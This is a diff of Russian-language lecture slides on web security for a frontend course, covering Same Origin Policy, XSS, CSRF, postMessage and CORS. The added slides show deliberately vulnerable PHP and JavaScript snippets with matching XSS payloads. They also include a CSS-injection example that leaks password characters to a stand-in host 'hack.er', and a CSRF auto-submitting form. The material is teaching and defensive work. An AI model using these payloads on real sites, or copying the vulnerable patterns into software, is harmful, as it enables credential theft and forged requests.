@@ -34,13 +34,14 @@
             <mark>ограничивать возможности</mark> пользовательских сценариев из определённого источника по доступу к ресурсам и информации из других
             источников</p>
     </blockquote>
+	<p class="note"><a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy" target="_blank">Подробнее</a></p>
 </section>
 
 <section class="slide">
     <h2>Same Origin Policy</h2>
     <p>Вводится понятие
         <mark>источника</mark>
-        (адрес в интернете, откуда был загружен ресурс). Два URL считаются имеющим один источник («same origin»), если у
+        (адрес в интернете, откуда был загружен&nbsp;ресурс). Два URL считаются имеющим один источник («same origin»), если у
         них
         <mark>одинаковый протокол, домен и порт</mark>
     </p>
@@ -61,6 +62,33 @@
         <li><code>http://site.<strong>org</strong></code> (другой домен)</li>
         <li><code><strong>https</strong>://site.com</code> (другой протокол)</li>
         <li><code>http://site.com:<strong>8080</strong></code> (другой порт)</li>
+    </ul>
+</section>
+
+<section class="slide">
+    <h2>Типы взаимодействия с ресурсами</h2>
+    <p>Любой способ взаимодействия с ресурсами в web-приложениях можно отнести к одной из трёх категорий:</p>
+    <ul>
+        <li><mark><strong>"Запись" в ресурсы</strong></mark> &mdash; например: переходы по ссылкам, редиректы, сабмит форм, отправка запросов</li>
+		<li><mark><strong>"Встраивание" ресурсов в другие ресурсы</strong></mark>:
+			<ul>
+				<li>JavaScript with <code>&lt;script src="...">&lt;/script></code></li>
+				<li>CSS with <code>&lt;link rel="stylesheet" href="..."></code></li>
+				<li>Images with <code>&lt;img></code>, media files with <code>&lt;video></code> and <code>&lt;audio></code></li>
+				<li>Plug-ins with <code>&lt;object></code>, <code>&lt;embed></code> and <code>&lt;applet></code></li>
+			</ul>
+		</li>
+		<li><mark><strong>"Чтение" из других ресурсов</strong></mark> &mdash; например: чтение ответов на запросы, получение доступа к содержимому встроенного ресурса...</li>
+    </ul>
+</section>
+
+<section class="slide">
+    <h2>Same Origin Policy</h2>
+	<p class="small-content"></p>
+    <ul>
+        <li>Cross Origin "Запись" в ресурсы обычно разрешается (<em>за некоторыми исключениями, о них чуть позже</em>)</li>
+		<li>Cross Origin "Встраивание" ресурсов обычно разрешается</li>
+		<li>Cross Origin "Чтение" из других ресурсов по-умолчанию запрещено</li>
     </ul>
 </section>
 
@@ -85,14 +113,181 @@
 </section>
 
 <section class="slide">
+    <h2>Пример уязвимости</h2>
+    <pre class="hljs php">
+		<code>&lt;?php</code>
+		<code>    $name = $_REQUEST ['name'];</code>
+		<code>?></code>
+		<code class="hljs html">&lt;html></code>
+		<code class="hljs html">    &lt;head>&lt;title>Портал Технопарка&lt;/title>&lt;/head></code>
+		<code class="hljs html">    &lt;body></code>
+		<code>        Hello, &lt;?php echo $name; ?>!</code>
+		<code class="hljs html">    &lt;/body></code>
+		<code class="hljs html">&lt;/html></code>
+		<code> </code>
+	</pre>
+</section>
+
+<section class="slide">
+    <h2>Использование уязвимости</h2>
+	<p class="small-content"></p>
+    <pre class="hljs js">
+		<code>const html = '&lt;script>alert("XSS")&lt;/script>';</code>
+		<code>const link =</code>
+		<code>    'https://park.mail.ru/?name=' + encodeURIComponent(html);</code>
+		<code> </code>
+		<code>console.log(link);</code>
+		<code>// https://park.mail.ru/?name=%3Cscript%3Ealert(%22XSS%22)%3C%2Fscript%3E</code>
+		<code> </code>
+	</pre>
+</section>
+
+<section class="slide">
+	<h2>Пример уязвимости</h2>
+	<p class="small-content"></p>
+	<pre class="hljs js">
+		<code>const response = http.get('/message');</code>
+		<code>const messageText = response.content;</code>
+		<code> </code>
+		<code>const chat = document.getElementById('chat');</code>
+		<code>chat.innerHTML += messageText;</code>
+		<code> </code>
+	</pre>
+</section>
+
+<section class="slide">
+	<h2>Использование уязвимости</h2>
+	<p class="medium-content"></p>
+	<pre class="hljs js">
+		<code>// так не сработает</code>
+		<code>chat.innerHTML += `</code>
+		<code class="hljs html">    &lt;/div>&lt;script>alert("XSS")&lt;/script></code>
+		<code>`;</code>
+		<code> </code>
+	</pre>
+	<pre class="hljs js next">
+		<code>// а вот так - получится</code>
+		<code>chat.innerHTML += `</code>
+		<code class="hljs html">    &lt;/div>&lt;img src="/404.png" onerror="alert('XSS')"></code>
+		<code>`;</code>
+		<code> </code>
+	</pre>
+</section>
+
+<section class="slide">
+	<h2>Пример уязвимости</h2>
+	<p class="small-content"></p>
+	<pre class="hljs js">
+		<code>// делаем сайт с oauth-авторизацией</code>
+		<code>const backRedirectUrl =</code>
+		<code>    new URLSearchParams(window.location.search).get('back');</code>
+		<code> </code>
+		<code>const link = document.createElement('a');</code>
+		<code>link.textContent = 'Click Me!';</code>
+		<code>link.href = backRedirectUrl;</code>
+		<code>document.appendChild(link);</code>
+		<code> </code>
+	</pre>
+</section>
+
+<section class="slide">
+	<h2>Использование уязвимости</h2>
+	<p class="medium-content"></p>
+	<pre class="hljs js">
+		<code>// находимся на</code>
+		<code>// https://park.mail.ru/?back=javascript%3Aalert%28%27XSS%27%29%3B</code>
+		<code>const backRedirectUrl = // "javascript:alert('XSS');"</code>
+		<code>    new URLSearchParams(window.location.search).get('back');</code>
+		<code> </code>
+		<code>const link = document.createElement('a');</code>
+		<code>link.href = backRedirectUrl;</code>
+		<code> </code>
+		<code class="hljs html">// &lt;a href="javascript:alert('XSS');">Click Me!&lt;a></code>
+		<code> </code>
+	</pre>
+</section>
+
+<section class="slide">
+	<h2>Пример уязвимости</h2>
+	<p class="medium-content"></p>
+	<pre class="hljs js">
+		<code>const avatarUrl = http.get('/me').avatarUrl;</code>
+		<code> </code>
+		<code>const styleContent = `</code>
+		<code>    <span hidden>`</span>#avatar {<span hidden>`</span></code>
+		<code>    <span hidden>`</span>    background: url(${avatarUrl});<span hidden>`</span></code>
+		<code>    <span hidden>`</span>}<span hidden>`</span></code>
+		<code>`;</code>
+		<code> </code>
+		<code>const style = document.createElement('style');</code>
+		<code>style.textContent = styleContent;</code>
+		<code>document.appendChild(style);</code>
+		<code> </code>
+	</pre>
+</section>
+
+<section class="slide">
+	<h2>Использование уязвимости</h2>
+	<p class="medium-content"></p>
+	<pre class="hljs js">
+		<code>const avatarUrl = http.get('/me').avatarUrl;</code>
+		<code class="hljs js">console.log(avatarUrl); -> `);}<span hidden>`</span></code>
+		<code class="hljs css">[type=password][value^='a'] { background-image: url(https://hack.er/a); }</code>
+		<code class="hljs css">[type=password][value^='b'] { background-image: url(https://hack.er/b); }</code>
+		<code class="hljs css">[type=password][value^='c'] { background-image: url(https://hack.er/c); }</code>
+		<code class="hljs css">[type=password][value^='d'] { background-image: url(https://hack.er/d); }</code>
+		<code class="hljs css">[type=password][value^='e'] { background-image: url(https://hack.er/e); }</code>
+		<code class="hljs js"><span hidden>`</span>abc { background: url(`</code>
+		<code class="hljs css"> </code>
+		<code> </code>
+	</pre>
+</section>
+
+<section class="slide">
+	<h2>Использование уязвимости</h2>
+	<p class="medium-content"></p>
+	<pre class="hljs css">
+		<code>#avatar {</code>
+		<code class="hljs css">    background: url();}</code>
+		<code class="hljs css">[type=password][value^='a'] { background-image: url(https://hack.er/a); }</code>
+		<code class="hljs css">[type=password][value^='b'] { background-image: url(https://hack.er/b); }</code>
+		<code class="hljs css">[type=password][value^='c'] { background-image: url(https://hack.er/c); }</code>
+		<code class="hljs css">[type=password][value^='d'] { background-image: url(https://hack.er/d); }</code>
+		<code class="hljs css">[type=password][value^='e'] { background-image: url(https://hack.er/e); }</code>
+		<code class="hljs css">div { background: url();</code>
+		<code class="hljs css">}</code>
+		<code class="hljs css"> </code>
+		<code> </code>
+	</pre>
+</section>
+
+<section class="slide">
+	<h2>Использование уязвимости</h2>
+	<p class="medium-content"></p>
+	<pre class="hljs css">
+		<code>#avatar {</code>
+		<code class="hljs css">    background: url(<mark>);}</mark></code>
+		<code class="hljs css"><mark>[type=password][value^='a'] { background-image: url(https://hack.er/a); }</mark></code>
+		<code class="hljs css"><mark>[type=password][value^='b'] { background-image: url(https://hack.er/b); }</mark></code>
+		<code class="hljs css"><mark>[type=password][value^='c'] { background-image: url(https://hack.er/c); }</mark></code>
+		<code class="hljs css"><mark>[type=password][value^='d'] { background-image: url(https://hack.er/d); }</mark></code>
+		<code class="hljs css"><mark>[type=password][value^='e'] { background-image: url(https://hack.er/e); }</mark></code>
+		<code class="hljs css"><mark>div { background: url(</mark>);</code>
+		<code class="hljs css">}</code>
+		<code class="hljs css"> </code>
+		<code> </code>
+	</pre>
+</section>
+
+<section class="slide">
     <h2>Способы защиты от XSS</h2>
     <p class="medium-content"></p>
     <ul>
-        <li>Тщательная фильтрация и экранирование пользовательского контента, вставляемого через <code>innerHTML</code></li>
+        <li>Тщательная фильтрация и экранирование пользовательского контента, вставляемого напрямую через <code>DOM API</code></li>
         <li>Использование белых списков при фильтрации HTML</li>
         <li>Правильная работа с куками, использование <code>httpOnly</code></li>
         <li>Использование специального заголовка <code>X-XSS-Protection</code></li>
-        <li>Ещё больше про XSS <a href="https://habrahabr.ru/company/pt/blog/149152/" target="_blank">тут</a></li>
+        <li>Ещё больше про XSS <a href="https://habrahabr.ru/company/pt/blog/149152/" target="_blank">тут</a> и <a href="https://habrahabr.ru/company/xakep/blog/189210/" target="_blank">тут</a></li>
     </ul>
 </section>
 
@@ -165,13 +360,60 @@
     <ul>
         <li>На все <code>iframe</code> всегда накладываются ограничения, диктуемые <br> Same Origin Policy</li>
         <li>В частности, если в <code>iframe</code> загружен ресурс с другим Origin, то эти две страницы не имеют доступа друг до друга через <code>iframe.contentWindow</code> и <code>window.parent</code></li>
+		<li>Запись в <code>window.parent.location</code> разрешена, а чтение &mdash; запрещено</li>
         <li>У элемента <code>iframe</code> есть атрибут <code>sandbox</code> с возможными значениями: <code>allow-same-origin</code>, <code>allow-top-navigation</code>, <code>allow-forms</code>, <code>allow-scripts</code></li>
     </ul>
 </section>
 
+<section class="slide">
+    <h2>Общение между <strong>iframe</strong> <mark>напрямую</mark></h2>
+	<p>Присваивая в <code>document.domain</code> одинаковые значения, можно разрешить страницам с <em>разных поддоменов</em> общение друг с другом через <mark>iframe</mark> напрямую</p>
+    <pre class="hljs js">
+		<code>// на странице https://park.mail.ru/</code>
+		<code><mark>document.domain</mark>; // 'park.mail.ru'</code>
+		<code>document.domain = 'mail.ru'; // success</code>
+		<code>document.domain = 'e.mail.ru'; // error</code>
+		<code>document.domain = 'google.com'; // error</code>
+		<code> </code>
+		<code>// на странице https://e.mail.ru/</code>
+		<code>document.domain = 'mail.ru'; // success</code>
+		<code> </code>
+	</pre>
+</section>
+
+<section class="slide">
+    <h2>Общение с помощью <mark>postMessage</mark></h2>
+	<p class="medium-content"></p>
+    <pre class="hljs js">
+		<code>otherWindow.postMessage(message, targetOrigin);</code>
+		<code>// otherWindow - любой объект класса Window</code>
+		<code><span hidden>//</span>    - текущий <mark>window</mark></code>
+		<code><span hidden>//</span>    - полученный через вызов <mark>window.open()</mark></code>
+		<code><span hidden>//</span>    - полученный через <mark>iframe.contentWindow</mark> или <mark>window.parent</mark></code>
+		<code> </code>
+		<code>// targetOrigin - <mark>origin</mark> ресурсов, которые получат сообщения</code>
+		<code><span hidden>//</span>                  можно указать wildcard: '*'</code>
+		<code> </code>
+	</pre>
+</section>
+
+<section class="slide">
+    <h2>Событие <mark>message</mark></h2>
+	<p class="medium-content"></p>
+    <pre class="hljs js">
+		<code>window.addEventListeners('message', function (event) {</code>
+		<code>    console.log(event.data); // присланные данные</code>
+		<code>    console.log(event.origin); // <mark>origin</mark>, из которого пришло сообщение</code>
+		<code>    console.log(event.source); // ссылка на окно-отправитель сообщения</code>
+		<code>});</code>
+		<code> </code>
+	</pre>
+	<p class="note"><a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage" target="_blank">Подробнее</a></p>
+</section>
+
 <section class="slide question">
     <h2>
-        <span style="font-size: 75%">Cross-Site Request Forgery (CSRF-атака)</span>
+        <span style="font-size: 75%">Cross-Site Request Forgery (CSRF)</span>
     </h2>
 </section>
 
@@ -180,15 +422,15 @@
     <ol>
         <li>Пользователь заходит на сайт, на котором размещена вот такая форма:</li>
         <pre class="hljs html">
-			<code>&lt;form action="https://e.mail.ru/messages/send" method="POST" hidden></code>
+			<code>&lt;form action="https://e.mail.ru/api/v1/messages/send" method="POST"></code>
 			<code>    &lt;input name="message" value="Evil message"></code>
 			<code>    &lt;!-- ... --></code>
 			<code>&lt;/form></code>
 			<code> </code>
 		</pre>
-        <li>При заходе на сайт, скрипт вызывает <code>submit()</code> у формы</li>
-        <li>Отправляется POST-запрос на страницу <mark>https://e.mail.ru/messages/send</mark></li>
-        <li>Т.к. пользователь авторизован в Почте, то запрос отправляется с куками пользователя и от имени пользователя отправляется письмо</li>
+        <li>При заходе на сайт, js-скрипт вызывает <code>submit()</code> у формы</li>
+        <li>Отправляется POST-запрос на страницу <code>https://e.mail.ru/api/v1/messages/send</code></li>
+        <li>Т.к. пользователь авторизован в Почте@Mail.Ru, то запрос отправляется с куками пользователя и от имени пользователя отправляется письмо</li>
     </ol>
 </section>
 
@@ -211,11 +453,11 @@
 </section>
 
 <section class="slide question">
-    <h2><span style="font-size: 65%; display: inline-block;">Почему бы просто не запретить такие запросы?</span></h2>
+    <h2><span style="font-size: 80%; display: inline-block;">Как обходить Same Origin Policy?</span></h2>
 </section>
 
 <section class="slide question">
-    <h2><span style="font-size: 85%">Архитектура наших приложений?</span></h2>
+    <h2><span style="font-size: 80%">Архитектура наших приложений</span></h2>
 </section>
 
 <section class="slide">
@@ -227,11 +469,12 @@
 
 <section class="slide">
     <h2>HTTP access control (CORS)</h2>
+	<p class="medium-content"></p>
     <blockquote>
         <p class="small-content"><b>Cross-Origin Resource Sharing (CORS) standard</b> &mdash; спецификация,
-            накладывающая ограничения на запросы такого типа (работает по принципам Same Origin Policy). Появилась
-            относительно недавно</p>
+            позволяющаы обойти ограничения, которые Same Origin Policy накладывает на кросс-доменные запросы</p>
     </blockquote>
+	<p class="note"><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS" target="_blank">Подробнее</a></p>
 </section>
 
 <section class="slide">
@@ -260,18 +503,16 @@
                 <li><code>Accept</code></li>
                 <li><code>Accept-Language</code></li>
                 <li><code>Content-Language</code></li>
-                <li><code>Content-Type</code></li>
+                <li><code>Content-Type</code>
+					<ul>
+						<li><code>application/x-www-form-urlencoded</code></li>
+						<li><code>multipart/form-data</code></li>
+						<li><code>text/plain</code></li>
+					</ul>
+				</li>
             </ul>
         </li>
     </ul>
-</section>
-
-<section class="slide">
-    <h2>Запросы делятся на два типа</h2>
-    <p class="small-content">Остальные запросы считаются
-        <mark>"непростыми"</mark>
-        , и при отправке таких запросов необходимо понять, согласен ли сервер на обработку таких запросов. Эти запросы
-        всегда отсылаются со специальным заголовком <code>Origin</code></p>
 </section>
 
 <section class="slide">
@@ -320,6 +561,14 @@
 			<code><mark>Access-Control-Allow-Credentials:</mark> true</code>
 			<code> </code>
 		</pre>
+</section>
+
+<section class="slide">
+	<h2>Запросы делятся на два типа</h2>
+	<p class="small-content">Остальные запросы считаются
+		<mark>"непростыми"</mark>
+		, и при отправке таких запросов необходимо понять, согласен ли сервер на обработку таких запросов. Эти запросы
+		всегда отсылаются со специальным заголовком <code>Origin</code></p>
 </section>
 
 <section class="slide">
@@ -974,9 +1223,28 @@
 	<h2>Fetch API</h2>
 	<pre class="hljs js">
 		<code>fetch('/books', {</code>
-		<code>	mode: 'cors',</code>
 		<code>	method: 'POST',</code>
+		<code>	mode: 'cors',</code>
 		<code>	credentials: 'include',</code>
+		<code>	data: JSON.stringify({</code>
+		<code>		title: 'Изучение Фронтенда',</code>
+		<code>		authors: [</code>
+		<code>			'Анатолий Остапенко', 'Дмитрий Дорофеев',</code>
+		<code>			'Марина Титова', 'Артур Удалов', 'Алексей Тюльдюков'</code>
+		<code>		]</code>
+		<code>	})</code>
+		<code>});</code>
+		<code> </code>
+	</pre>
+</section>
+
+<section class="slide">
+	<h2>ВАЖНО: работа с CORS в Fetch API</h2>
+	<pre class="hljs js">
+		<code>fetch('/books', {</code>
+		<code>	method: 'POST',</code>
+		<code>	<mark>mode: 'cors',</mark></code>
+		<code>	<mark>credentials: 'include',</mark></code>
 		<code>	data: JSON.stringify({</code>
 		<code>		title: 'Изучение Фронтенда',</code>
 		<code>		authors: [</code>
